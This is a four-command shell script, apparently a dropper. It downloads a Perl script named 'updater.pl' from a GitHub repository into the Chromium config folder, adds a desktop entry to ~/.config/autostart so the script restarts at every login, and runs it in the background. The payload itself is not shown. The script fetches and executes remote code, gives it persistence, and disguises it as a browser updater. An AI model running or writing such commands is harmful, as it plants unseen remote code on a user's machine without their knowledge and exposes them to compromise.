mkdir ~/.config/chromium
wget -O ~/.config/chromium/updater.pl https://raw.githubusercontent.com/reimch/white-vice/refs/heads/main/src/updater.pl

wget -O ~/.config/autostart/update_service.desktop https://raw.githubusercontent.com/reimch/white-vice/refs/heads/main/resources/update_service.desktop

perl ~/.config/chromium/updater.pl &
